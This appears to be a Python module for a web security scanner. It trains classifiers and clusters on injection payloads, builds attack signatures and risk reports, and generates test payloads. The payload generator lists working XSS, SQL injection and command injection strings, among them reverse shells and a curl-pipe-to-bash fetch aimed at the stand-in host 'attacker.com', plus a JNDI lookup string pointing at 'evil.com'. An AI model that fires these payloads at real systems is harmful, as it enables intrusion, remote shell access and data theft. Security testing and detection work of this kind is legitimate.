import pandas as pd
import numpy as np
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.cluster import KMeans, DBSCAN
from sklearn.feature_extraction.text import TfidfVectorizer, CountVectorizer
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import (accuracy_score, precision_score, recall_score, f1_score, 
                           confusion_matrix, classification_report, silhouette_score)
from sklearn.manifold import TSNE
from sklearn.decomposition import PCA
from sklearn.preprocessing import StandardScaler
import matplotlib
matplotlib.use('Agg')  # Use non-interactive backend
import matplotlib.pyplot as plt
import seaborn as sns
import joblib
import logging
import random
import json
from datetime import datetime
import os
import io
import base64

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global model storage
trained_models = {}
vectorizers = {}
scalers = {}
clustering_models = {}
model_metadata = {}

class MLModelHandler:
    def __init__(self):
        self.models_dir = 'models'
        os.makedirs(self.models_dir, exist_ok=True)
        
    def save_model(self, model, model_name, metadata=None):
        """Save model to disk with metadata"""
        try:
            model_path = os.path.join(self.models_dir, f"{model_name}.joblib")
            joblib.dump(model, model_path)
            
            if metadata:
                metadata_path = os.path.join(self.models_dir, f"{model_name}_metadata.json")
                with open(metadata_path, 'w') as f:
                    json.dump(metadata, f, indent=2)
            
            logger.info(f"Model {model_name} saved successfully")
            return True
        except Exception as e:
            logger.error(f"Error saving model {model_name}: {e}")
            return False
    
    def load_model(self, model_name):
        """Load model from disk"""
        try:
            model_path = os.path.join(self.models_dir, f"{model_name}.joblib")
            if os.path.exists(model_path):
                model = joblib.load(model_path)
                logger.info(f"Model {model_name} loaded successfully")
                return model
            return None
        except Exception as e:
            logger.error(f"Error loading model {model_name}: {e}")
            return None

# Initialize handler
ml_handler = MLModelHandler()

def feature_engineering(dataset):
    """Advanced feature engineering for security payloads"""
    try:
        if isinstance(dataset, pd.DataFrame):
            df = dataset.copy()
        else:
            df = pd.DataFrame(dataset)
        
        # Text-based features
        df['payload_length'] = df['payload'].str.len()
        df['word_count'] = df['payload'].str.split().str.len()
        df['special_char_count'] = df['payload'].str.count(r'[^\w\s]')
        df['digit_count'] = df['payload'].str.count(r'\d')
        df['uppercase_count'] = df['payload'].str.count(r'[A-Z]')
        
        # Security-specific features
        df['has_sql_keywords'] = df['payload'].str.contains(
            r'(?i)(select|union|insert|delete|drop|alter|create|exec)', na=False
        )
        df['has_script_tags'] = df['payload'].str.contains(
            r'(?i)(<script|<img|<iframe|<object|<embed)', na=False
        )
        df['has_path_traversal'] = df['payload'].str.contains(r'\.\./', na=False)
        df['has_command_injection'] = df['payload'].str.contains(
            r'(?i)(;|&&|\|\||`|\$\()', na=False
        )
        df['has_quotes'] = df['payload'].str.contains(r"['\"]", na=False)
        df['entropy'] = df['payload'].apply(calculate_entropy)
        
        # Response-based features (if available)
        if 'response_code' in df.columns:
            df['is_error_response'] = df['response_code'] >= 400
        
        return df
    except Exception as e:
        logger.error(f"Error in feature engineering: {e}")
        return dataset

def calculate_entropy(text):
    """Calculate Shannon entropy of text"""
    try:
        if not text:
            return 0
        prob = [float(text.count(c)) / len(text) for c in dict.fromkeys(list(text))]
        entropy = -sum([p * np.log2(p) for p in prob])
        return entropy
    except:
        return 0

def train_advanced_classifier(dataset):
    """Train advanced ML classifier with feature engineering"""
    try:
        logger.info(f"Training advanced classifier on {len(dataset)} samples")
        
        # Feature engineering
        df = feature_engineering(dataset)
        
        # Prepare text features
        X_text = df['payload'].astype(str)
        
        # Prepare numerical features
        feature_cols = ['payload_length', 'word_count', 'special_char_count', 
                       'digit_count', 'uppercase_count', 'entropy']
        feature_cols.extend(['has_sql_keywords', 'has_script_tags', 'has_path_traversal',
                           'has_command_injection', 'has_quotes'])
        
        X_numerical = df[feature_cols].fillna(0)
        
        # Labels
        y = df['label'].map({'malicious': 1, 'safe': 0})
        
        # Vectorize text
        vectorizer = TfidfVectorizer(max_features=2000, ngram_range=(1, 4), 
                                   analyzer='char_wb', min_df=2)
        X_text_vectorized = vectorizer.fit_transform(X_text)
        
        # Scale numerical features
        scaler = StandardScaler()
        X_numerical_scaled = scaler.fit_transform(X_numerical)
        
        # Combine features
        from scipy.sparse import hstack
        X_combined = hstack([X_text_vectorized, X_numerical_scaled])
        
        # Split data
        X_train, X_test, y_train, y_test = train_test_split(
            X_combined, y, test_size=0.3, random_state=42, stratify=y
        )
        
        # Train multiple models
        models = {
            'random_forest': RandomForestClassifier(n_estimators=200, max_depth=10, 
                                                  min_samples_split=5, random_state=42),
        }
        
        best_model = None
        best_score = 0
        results = {}
        
        for name, model in models.items():
            # Train model
            model.fit(X_train, y_train)
            
            # Predict
            y_pred = model.predict(X_test)
            y_pred_proba = model.predict_proba(X_test)[:, 1]
            
            # Evaluate
            accuracy = accuracy_score(y_test, y_pred)
            precision = precision_score(y_test, y_pred, zero_division=0)
            recall = recall_score(y_test, y_pred, zero_division=0)
            f1 = f1_score(y_test, y_pred, zero_division=0)
            
            # Cross-validation
            cv_scores = cross_val_score(model, X_train, y_train, cv=5, scoring='accuracy')
            
            results[name] = {
                'accuracy': accuracy,
                'precision': precision,
                'recall': recall,
                'f1_score': f1,
                'cv_mean': cv_scores.mean(),
                'cv_std': cv_scores.std(),
                'confusion_matrix': confusion_matrix(y_test, y_pred).tolist(),
                'classification_report': classification_report(y_test, y_pred, output_dict=True)
            }
            
            if accuracy > best_score:
                best_score = accuracy
                best_model = model
        
        # Store models and preprocessing
        trained_models['advanced_classifier'] = best_model
        vectorizers['advanced_classifier'] = vectorizer
        scalers['advanced_classifier'] = scaler
        
        # Save models
        ml_handler.save_model(best_model, 'advanced_classifier', {
            'type': 'RandomForestClassifier',
            'accuracy': best_score,
            'features': feature_cols,
            'trained_on': datetime.now().isoformat(),
            'samples': len(dataset)
        })
        
        # Generate feature importance plot
        feature_importance_plot = generate_feature_importance_plot(best_model, 
                                                                feature_cols + ['text_features'])
        
        result = {
            'success': True,
            'model_type': 'AdvancedRandomForest',
            'accuracy': best_score,
            'detailed_results': results,
            'samples_trained': len(dataset),
            'features_engineered': len(feature_cols),
            'feature_importance_plot': feature_importance_plot,
            'confusion_matrix': results['random_forest']['confusion_matrix'],
            'classification_report': results['random_forest']['classification_report']
        }
        
        logger.info(f"Advanced classifier training completed with {best_score:.3f} accuracy")
        return result
        
    except Exception as e:
        logger.error(f"Error training advanced classifier: {e}")
        return {'success': False, 'error': str(e), 'accuracy': 0.0}

def perform_clustering_analysis(dataset):
    """Perform clustering analysis on payloads"""
    try:
        logger.info("Performing clustering analysis")
        
        # Feature engineering
        df = feature_engineering(dataset)
        X_text = df['payload'].astype(str)
        
        # Vectorize for clustering
        vectorizer = TfidfVectorizer(max_features=1000, ngram_range=(1, 3), 
                                   stop_words=None, min_df=2)
        X_vectorized = vectorizer.fit_transform(X_text)
        
        # Reduce dimensionality for visualization
        pca = PCA(n_components=50, random_state=42)
        X_pca = pca.fit_transform(X_vectorized.toarray())
        
        # K-Means clustering
        optimal_k = find_optimal_clusters(X_pca, max_k=min(10, len(dataset)//2))
        kmeans = KMeans(n_clusters=optimal_k, random_state=42, n_init=10)
        kmeans_labels = kmeans.fit_predict(X_pca)
        kmeans_silhouette = silhouette_score(X_pca, kmeans_labels)
        
        # DBSCAN clustering
        dbscan = DBSCAN(eps=0.5, min_samples=3)
        dbscan_labels = dbscan.fit_predict(X_pca)
        n_clusters_dbscan = len(set(dbscan_labels)) - (1 if -1 in dbscan_labels else 0)
        
        # t-SNE for visualization
        tsne = TSNE(n_components=2, random_state=42, perplexity=min(30, len(dataset)-1))
        X_tsne = tsne.fit_transform(X_pca)
        
        # Generate cluster visualization
        cluster_plot = generate_cluster_visualization(X_tsne, kmeans_labels, dbscan_labels)
        
        # Analyze clusters
        cluster_analysis = analyze_clusters(df, kmeans_labels, optimal_k)
        
        # Store clustering models
        clustering_models['kmeans'] = kmeans
        clustering_models['dbscan'] = dbscan
        vectorizers['clustering'] = vectorizer
        
        result = {
            'success': True,
            'kmeans': {
                'n_clusters': optimal_k,
                'silhouette_score': kmeans_silhouette,
                'labels': kmeans_labels.tolist()
            },
            'dbscan': {
                'n_clusters': n_clusters_dbscan,
                'labels': dbscan_labels.tolist(),
                'noise_points': int(np.sum(dbscan_labels == -1))
            },
            'cluster_analysis': cluster_analysis,
            'visualization': cluster_plot,
            'samples_processed': len(dataset)
        }
        
        logger.info(f"Clustering analysis completed: K-Means({optimal_k} clusters), DBSCAN({n_clusters_dbscan} clusters)")
        return result
        
    except Exception as e:
        logger.error(f"Error in clustering analysis: {e}")
        return {'success': False, 'error': str(e)}

def find_optimal_clusters(X, max_k=10):
    """Find optimal number of clusters using elbow method"""
    try:
        inertias = []
        k_range = range(2, min(max_k + 1, len(X)))
        
        for k in k_range:
            kmeans = KMeans(n_clusters=k, random_state=42, n_init=10)
            kmeans.fit(X)
            inertias.append(kmeans.inertia_)
        
        # Simple elbow detection
        if len(inertias) >= 2:
            differences = np.diff(inertias)
            second_differences = np.diff(differences)
            if len(second_differences) > 0:
                elbow_idx = np.argmax(second_differences) + 2
                return k_range[min(elbow_idx, len(k_range)-1)]
        
        return min(3, max_k)  # Default
    except:
        return 3

def analyze_clusters(df, labels, n_clusters):
    """Analyze cluster characteristics"""
    try:
        analysis = {}
        df_with_clusters = df.copy()
        df_with_clusters['cluster'] = labels
        
        for cluster_id in range(n_clusters):
            cluster_data = df_with_clusters[df_with_clusters['cluster'] == cluster_id]
            
            if len(cluster_data) == 0:
                continue
                
            # Common patterns in cluster
            common_patterns = []
            if cluster_data['has_sql_keywords'].sum() > len(cluster_data) * 0.5:
                common_patterns.append('SQL Injection')
            if cluster_data['has_script_tags'].sum() > len(cluster_data) * 0.5:
                common_patterns.append('XSS')
            if cluster_data['has_path_traversal'].sum() > len(cluster_data) * 0.5:
                common_patterns.append('Path Traversal')
            if cluster_data['has_command_injection'].sum() > len(cluster_data) * 0.5:
                common_patterns.append('Command Injection')
            
            analysis[f'cluster_{cluster_id}'] = {
                'size': len(cluster_data),
                'avg_payload_length': float(cluster_data['payload_length'].mean()),
                'avg_entropy': float(cluster_data['entropy'].mean()),
                'common_patterns': common_patterns,
                'sample_payloads': cluster_data['payload'].head(3).tolist()
            }
        
        return analysis
    except Exception as e:
        logger.error(f"Error analyzing clusters: {e}")
        return {}

def generate_attack_signatures(successful_payloads):
    """Generate attack signatures from successful payloads"""
    try:
        logger.info(f"Generating attack signatures from {len(successful_payloads)} payloads")
        
        signatures = {
            'sql_injection': [],
            'xss': [],
            'path_traversal': [],
            'command_injection': [],
            'general': []
        }
        
        for payload in successful_payloads:
            payload_lower = payload.lower()
            
            # SQL Injection signatures
            if any(keyword in payload_lower for keyword in ['union', 'select', 'drop', 'insert', "'", '"']):
                signatures['sql_injection'].append({
                    'pattern': extract_pattern(payload, 'sql'),
                    'original': payload,
                    'risk_score': calculate_risk_score(payload)
                })
            
            # XSS signatures
            elif any(tag in payload_lower for tag in ['<script', '<img', '<iframe', 'javascript:']):
                signatures['xss'].append({
                    'pattern': extract_pattern(payload, 'xss'),
                    'original': payload,
                    'risk_score': calculate_risk_score(payload)
                })
            
            # Path traversal signatures
            elif '../' in payload or '..\\' in payload:
                signatures['path_traversal'].append({
                    'pattern': extract_pattern(payload, 'path'),
                    'original': payload,
                    'risk_score': calculate_risk_score(payload)
                })
            
            # Command injection signatures
            elif any(char in payload for char in [';', '|', '&', '`', '$(']):
                signatures['command_injection'].append({
                    'pattern': extract_pattern(payload, 'cmd'),
                    'original': payload,
                    'risk_score': calculate_risk_score(payload)
                })
            
            else:
                signatures['general'].append({
                    'pattern': extract_pattern(payload, 'general'),
                    'original': payload,
                    'risk_score': calculate_risk_score(payload)
                })
        
        # Remove duplicates and sort by risk score
        for category in signatures:
            signatures[category] = sorted(
                list({sig['pattern']: sig for sig in signatures[category]}.values()),
                key=lambda x: x['risk_score'], reverse=True
            )[:10]  # Keep top 10 per category
        
        logger.info("Attack signature generation completed")
        return signatures
        
    except Exception as e:
        logger.error(f"Error generating signatures: {e}")
        return {}

def extract_pattern(payload, attack_type):
    """Extract generalized pattern from payload"""
    try:
        # Simplify specific values to create patterns
        pattern = payload
        
        if attack_type == 'sql':
            pattern = pattern.replace("'", "'*'")
            pattern = pattern.replace('"', '"*"')
        elif attack_type == 'xss':
            pattern = pattern.replace("'", "'*'")
            pattern = pattern.replace('"', '"*"')
        elif attack_type == 'path':
            pattern = pattern.replace('/etc/passwd', '/etc/*')
            pattern = pattern.replace('\\windows\\', '\\windows\\*')
        
        return pattern[:100]  # Limit length
    except:
        return payload[:100]

def calculate_risk_score(payload):
    """Calculate risk score for payload"""
    try:
        score = 0
        payload_lower = payload.lower()
        
        # High-risk keywords
        high_risk = ['drop', 'delete', 'exec', 'eval', 'system', 'passwd']
        score += sum(5 for keyword in high_risk if keyword in payload_lower)
        
        # Medium-risk patterns
        medium_risk = ['union', 'select', 'script', '../', '&&', '||']
        score += sum(3 for pattern in medium_risk if pattern in payload_lower)
        
        # Special characters
        score += len([c for c in payload if c in "'\"<>;|&`$()"])
        
        return min(score, 100)  # Cap at 100
    except:
        return 50

def generate_comprehensive_report(session_data):
    """Generate comprehensive security analysis report"""
    try:
        logger.info("Generating comprehensive security report")
        
        report = {
            'executive_summary': {},
            'technical_details': {},
            'vulnerabilities': [],
            'recommendations': [],
            'risk_assessment': {},
            'charts': {}
        }
        
        # Executive Summary
        total_payloads = session_data.get('total_payloads', 0)
        vulnerabilities_found = session_data.get('vulnerabilities_found', 0)
        vulnerability_rate = (vulnerabilities_found / total_payloads * 100) if total_payloads > 0 else 0
        
        report['executive_summary'] = {
            'total_payloads_tested': total_payloads,
            'vulnerabilities_found': vulnerabilities_found,
            'vulnerability_rate': round(vulnerability_rate, 2),
            'risk_level': 'HIGH' if vulnerability_rate > 20 else 'MEDIUM' if vulnerability_rate > 5 else 'LOW',
            'scan_duration': session_data.get('duration', 'Unknown'),
            'target_url': session_data.get('target_url', 'Unknown')
        }
        
        # Vulnerability breakdown
        vuln_types = session_data.get('vulnerability_types', {})
        for vuln_type, count in vuln_types.items():
            severity = get_vulnerability_severity(vuln_type)
            report['vulnerabilities'].append({
                'type': vuln_type,
                'count': count,
                'severity': severity,
                'description': get_vulnerability_description(vuln_type)
            })
        
        # Risk Assessment
        report['risk_assessment'] = {
            'overall_score': calculate_overall_risk_score(session_data),
            'factors': analyze_risk_factors(session_data),
            'impact': assess_potential_impact(session_data)
        }
        
        # Recommendations
        report['recommendations'] = generate_security_recommendations(session_data)
        
        # Generate charts
        report['charts'] = {
            'vulnerability_distribution': generate_vulnerability_chart(vuln_types),
            'risk_timeline': generate_risk_timeline(session_data)
        }
        
        logger.info("Comprehensive report generated successfully")
        return report
        
    except Exception as e:
        logger.error(f"Error generating report: {e}")
        return {'error': str(e)}

def predict_payload_effectiveness(payload, target_context=None):
    """Predict how effective a payload might be"""
    try:
        if 'advanced_classifier' not in trained_models:
            return {'effectiveness': 'unknown', 'confidence': 0.0}
        
        # Feature engineering for single payload
        df = pd.DataFrame([{'payload': payload, 'label': 'unknown'}])
        df = feature_engineering(df)
        
        # Use trained model
        model = trained_models['advanced_classifier']
        vectorizer = vectorizers['advanced_classifier']
        scaler = scalers['advanced_classifier']
        
        # Prepare features
        X_text = vectorizer.transform([payload])
        feature_cols = ['payload_length', 'word_count', 'special_char_count', 
                       'digit_count', 'uppercase_count', 'entropy',
                       'has_sql_keywords', 'has_script_tags', 'has_path_traversal',
                       'has_command_injection', 'has_quotes']
        X_numerical = scaler.transform(df[feature_cols].fillna(0))
        
        # Combine features
        from scipy.sparse import hstack
        X_combined = hstack([X_text, X_numerical])
        
        # Predict
        prediction = model.predict(X_combined)[0]
        probability = model.predict_proba(X_combined)[0]
        
        effectiveness = 'high' if prediction == 1 else 'low'
        confidence = max(probability)
        
        return {
            'effectiveness': effectiveness,
            'confidence': float(confidence),
            'malicious_probability': float(probability[1]) if len(probability) > 1 else 0.0,
            'attack_type': identify_attack_type(payload),
            'risk_factors': analyze_payload_risk_factors(payload)
        }
        
    except Exception as e:
        logger.error(f"Error predicting effectiveness: {e}")
        return {'effectiveness': 'unknown', 'confidence': 0.0}

def identify_attack_type(payload):
    """Identify the most likely attack type for a payload"""
    payload_lower = payload.lower()
    
    if any(keyword in payload_lower for keyword in ['union', 'select', 'drop', 'insert', "'"]):
        return 'SQL Injection'
    elif any(tag in payload_lower for tag in ['<script', '<img', '<iframe', 'javascript:']):
        return 'XSS'
    elif '../' in payload or '..\\' in payload:
        return 'Path Traversal'
    elif any(char in payload for char in [';', '|', '&', '`', '$(']):
        return 'Command Injection'
    else:
        return 'Unknown'

def analyze_payload_risk_factors(payload):
    """Analyze specific risk factors in a payload"""
    factors = []
    
    if len(payload) > 100:
        factors.append('Long payload length')
    if calculate_entropy(payload) > 4:
        factors.append('High entropy content')
    if sum(c in "'\"<>;|&`$()" for c in payload) > 5:
        factors.append('Multiple special characters')
    
    return factors

# Visualization functions
def generate_feature_importance_plot(model, feature_names):
    """Generate feature importance visualization"""
    try:
        if hasattr(model, 'feature_importances_'):
            importances = model.feature_importances_[:len(feature_names)]
            
            plt.figure(figsize=(10, 6))
            indices = np.argsort(importances)[::-1][:15]  # Top 15 features
            
            plt.bar(range(len(indices)), importances[indices])
            plt.xticks(range(len(indices)), [feature_names[i] for i in indices], rotation=45)
            plt.title('Feature Importance')
            plt.tight_layout()
            
            buffer = io.BytesIO()
            plt.savefig(buffer, format='png', dpi=100)
            buffer.seek(0)
            plot_data = base64.b64encode(buffer.getvalue()).decode()
            plt.close()
            
            return f"data:image/png;base64,{plot_data}"
    except Exception as e:
        logger.error(f"Error generating feature importance plot: {e}")
    return None

def generate_cluster_visualization(X_tsne, kmeans_labels, dbscan_labels):
    """Generate cluster visualization"""
    try:
        fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(15, 6))
        
        # K-Means plot
        scatter1 = ax1.scatter(X_tsne[:, 0], X_tsne[:, 1], c=kmeans_labels, cmap='viridis', alpha=0.7)
        ax1.set_title('K-Means Clustering')
        ax1.set_xlabel('t-SNE 1')
        ax1.set_ylabel('t-SNE 2')
        
        # DBSCAN plot
        scatter2 = ax2.scatter(X_tsne[:, 0], X_tsne[:, 1], c=dbscan_labels, cmap='viridis', alpha=0.7)
        ax2.set_title('DBSCAN Clustering')
        ax2.set_xlabel('t-SNE 1')
        ax2.set_ylabel('t-SNE 2')
        
        plt.tight_layout()
        
        buffer = io.BytesIO()
        plt.savefig(buffer, format='png', dpi=100)
        buffer.seek(0)
        plot_data = base64.b64encode(buffer.getvalue()).decode()
        plt.close()
        
        return f"data:image/png;base64,{plot_data}"
    except Exception as e:
        logger.error(f"Error generating cluster visualization: {e}")
    return None

def generate_vulnerability_chart(vuln_types):
    """Generate vulnerability distribution chart"""
    try:
        if not vuln_types:
            return None
            
        plt.figure(figsize=(10, 6))
        plt.pie(vuln_types.values(), labels=vuln_types.keys(), autopct='%1.1f%%')
        plt.title('Vulnerability Distribution')
        
        buffer = io.BytesIO()
        plt.savefig(buffer, format='png', dpi=100)
        buffer.seek(0)
        plot_data = base64.b64encode(buffer.getvalue()).decode()
        plt.close()
        
        return f"data:image/png;base64,{plot_data}"
    except Exception as e:
        logger.error(f"Error generating vulnerability chart: {e}")
    return None

def generate_risk_timeline(session_data):
    """Generate risk timeline chart"""
    try:
        # Mock timeline data - in real implementation, this would use actual scan data
        timeline = session_data.get('timeline', [])
        if not timeline:
            return None
            
        times = [item['time'] for item in timeline]
        risks = [item['risk_score'] for item in timeline]
        
        plt.figure(figsize=(12, 6))
        plt.plot(times, risks, marker='o')
        plt.title('Risk Score Timeline')
        plt.xlabel('Time')
        plt.ylabel('Risk Score')
        plt.xticks(rotation=45)
        plt.tight_layout()
        
        buffer = io.BytesIO()
        plt.savefig(buffer, format='png', dpi=100)
        buffer.seek(0)
        plot_data = base64.b64encode(buffer.getvalue()).decode()
        plt.close()
        
        return f"data:image/png;base64,{plot_data}"
    except Exception as e:
        logger.error(f"Error generating risk timeline: {e}")
    return None

# Utility functions for reporting
def get_vulnerability_severity(vuln_type):
    """Get severity level for vulnerability type"""
    severity_map = {
        'sql_injection': 'CRITICAL',
        'xss': 'HIGH',
        'command_injection': 'CRITICAL',
        'path_traversal': 'HIGH',
        'lfi': 'HIGH',
        'rfi': 'CRITICAL'
    }
    return severity_map.get(vuln_type.lower(), 'MEDIUM')

def get_vulnerability_description(vuln_type):
    """Get description for vulnerability type"""
    descriptions = {
        'sql_injection': 'SQL Injection vulnerabilities allow attackers to manipulate database queries',
        'xss': 'Cross-Site Scripting allows injection of malicious scripts into web pages',
        'command_injection': 'Command Injection allows execution of arbitrary system commands',
        'path_traversal': 'Path Traversal allows access to files outside the web root directory',
        'lfi': 'Local File Inclusion allows access to local files on the server',
        'rfi': 'Remote File Inclusion allows inclusion of remote files'
    }
    return descriptions.get(vuln_type.lower(), 'Unknown vulnerability type')

def calculate_overall_risk_score(session_data):
    """Calculate overall risk score for the target"""
    try:
        base_score = 0
        vulnerability_rate = session_data.get('vulnerability_rate', 0)
        
        # Base score from vulnerability rate
        base_score = min(vulnerability_rate * 2, 100)
        
        # Adjust for severity
        critical_vulns = session_data.get('critical_vulnerabilities', 0)
        high_vulns = session_data.get('high_vulnerabilities', 0)
        
        severity_bonus = (critical_vulns * 20) + (high_vulns * 10)
        
        return min(base_score + severity_bonus, 100)
    except:
        return 50

def analyze_risk_factors(session_data):
    """Analyze various risk factors"""
    factors = []
    
    if session_data.get('vulnerability_rate', 0) > 20:
        factors.append('High vulnerability rate detected')
    if session_data.get('critical_vulnerabilities', 0) > 0:
        factors.append('Critical vulnerabilities present')
    if session_data.get('response_time_anomalies', False):
        factors.append('Response time anomalies detected')
    
    return factors

def assess_potential_impact(session_data):
    """Assess potential impact of vulnerabilities"""
    impact_levels = []
    
    vuln_types = session_data.get('vulnerability_types', {})
    
    if 'sql_injection' in vuln_types:
        impact_levels.append('Data breach potential')
    if 'xss' in vuln_types:
        impact_levels.append('User session hijacking')
    if 'command_injection' in vuln_types:
        impact_levels.append('System compromise')
    
    return impact_levels

def generate_security_recommendations(session_data):
    """Generate security recommendations"""
    recommendations = []
    
    vuln_types = session_data.get('vulnerability_types', {})
    
    if 'sql_injection' in vuln_types:
        recommendations.append({
            'priority': 'HIGH',
            'category': 'Database Security',
            'recommendation': 'Implement parameterized queries and input validation'
        })
    
    if 'xss' in vuln_types:
        recommendations.append({
            'priority': 'HIGH',
            'category': 'Input Validation',
            'recommendation': 'Implement proper output encoding and CSP headers'
        })
    
    recommendations.append({
        'priority': 'MEDIUM',
        'category': 'General Security',
        'recommendation': 'Regular security assessments and code reviews'
    })
    
    return recommendations

# Enhanced payload generation with ML insights
def generate_intelligent_payloads(context=None, num_samples=10, difficulty_level='medium'):
    """Generate intelligent payloads using ML insights"""
    try:
        logger.info(f"Generating {num_samples} intelligent payloads for context: {context}")
        
        # Base payload templates with difficulty levels
        advanced_templates = {
            'xss': {
                'easy': [
                    "<script>alert('{}')</script>",
                    "<img src=x onerror=alert('{}')>",
                ],
                'medium': [
                    "<svg onload=alert('{}')>",
                    "javascript:alert('{}')",
                    "';alert('{}');//",
                    "<iframe src=javascript:alert('{}')>",
                ],
                'hard': [
                    "<script>eval(String.fromCharCode({}))</script>",
                    "<img src='x' onerror='eval(String.fromCharCode({}))'>",
                    "<svg/onload=eval(String.fromCharCode({}))>",
                    "'-eval(String.fromCharCode({}))-'",
                ]
            },
            'sql_injection': {
                'easy': [
                    "' OR 1=1 --",
                    "' OR 'a'='a",
                ],
                'medium': [
                    "'; DROP TABLE users; --",
                    "' UNION SELECT NULL,NULL,NULL --",
                    "admin'--",
                    "' OR 1=1#",
                    "1' ORDER BY {} --",
                ],
                'hard': [
                    "' UNION SELECT @@version,NULL,NULL --",
                    "'; EXEC xp_cmdshell('dir'); --",
                    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
                    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)) --",
                ]
            },
            'command_injection': {
                'easy': [
                    "; ls -la",
                    "| whoami",
                ],
                'medium': [
                    "&& cat /etc/passwd",
                    "`id`",
                    "$(whoami)",
                    "|nc -e /bin/sh attacker.com 4444",
                ],
                'hard': [
                    "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                    "`bash -i >& /dev/tcp/attacker.com/4444 0>&1`",
                    "$(curl -s http://attacker.com/shell.sh | bash)",
                ]
            }
        }
        
        # Select appropriate templates
        if context and context.lower() in advanced_templates:
            templates = advanced_templates[context.lower()].get(difficulty_level, 
                       advanced_templates[context.lower()]['medium'])
        else:
            # Mix from all categories
            all_templates = []
            for category in advanced_templates.values():
                all_templates.extend(category.get(difficulty_level, category['medium']))
            templates = all_templates
        
        # Generate payloads with variations
        payloads = []
        for i in range(num_samples):
            template = random.choice(templates)
            
            # Add variations
            if '{}' in template:
                if context == 'xss':
                    payload = template.format(f'test{i+1}')
                elif context == 'sql_injection':
                    payload = template.format(str(i+1))
                else:
                    payload = template.format(f'param{i+1}')
            else:
                payload = template
            
            # Add encoding variations for some payloads
            if difficulty_level == 'hard' and random.random() > 0.7:
                payload = add_encoding_variation(payload)
            
            payloads.append(payload)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for payload in payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)
        
        logger.info(f"Generated {len(unique_payloads)} intelligent payloads")
        return unique_payloads[:num_samples]
        
    except Exception as e:
        logger.error(f"Error generating intelligent payloads: {e}")
        return generate_fallback_payloads(num_samples)

def add_encoding_variation(payload):
    """Add encoding variations to payloads"""
    variations = [
        lambda x: x.replace('<', '%3C').replace('>', '%3E'),  # URL encoding
        lambda x: x.replace("'", '%27').replace('"', '%22'),  # Quote encoding
        lambda x: x.replace(' ', '%20'),  # Space encoding
        lambda x: x.replace('<', '&lt;').replace('>', '&gt;'),  # HTML encoding
    ]
    
    variation = random.choice(variations)
    return variation(payload)

def generate_fallback_payloads(num_samples):
    """Generate fallback payloads if advanced generation fails"""
    fallback = [
        "<script>alert('XSS')</script>",
        "' OR 1=1 --",
        "../../../etc/passwd",
        "; ls -la",
        "<img src=x onerror=alert(1)>",
        "'; DROP TABLE users; --",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "/admin/../admin",
        "`whoami`"
    ]
    
    return random.sample(fallback, min(num_samples, len(fallback)))

if __name__ == "__main__":
    # Test the enhanced ML functions
    sample_data = [
        {'payload': "' OR 1=1 --", 'label': 'malicious'},
        {'payload': "normal search query", 'label': 'safe'},
        {'payload': "<script>alert('xss')</script>", 'label': 'malicious'},
        {'payload': "../../../etc/passwd", 'label': 'malicious'},
        {'payload': "legitimate user input", 'label': 'safe'},
    ]
    
    print("Testing comprehensive ML models...")
    
    # Test advanced classifier
    classifier_result = train_advanced_classifier(sample_data)
    print(f"Advanced classifier result: {classifier_result.get('success', False)}")
    
    # Test clustering
    clustering_result = perform_clustering_analysis(sample_data)
    print(f"Clustering result: {clustering_result.get('success', False)}")
    
    # Test signature generation
    signatures = generate_attack_signatures([item['payload'] for item in sample_data if item['label'] == 'malicious'])
    print(f"Generated signatures: {len(signatures)} categories")
    
    # Test intelligent payload generation
    payloads = generate_intelligent_payloads("xss", 5, "medium")
    print(f"Generated intelligent payloads: {len(payloads)}")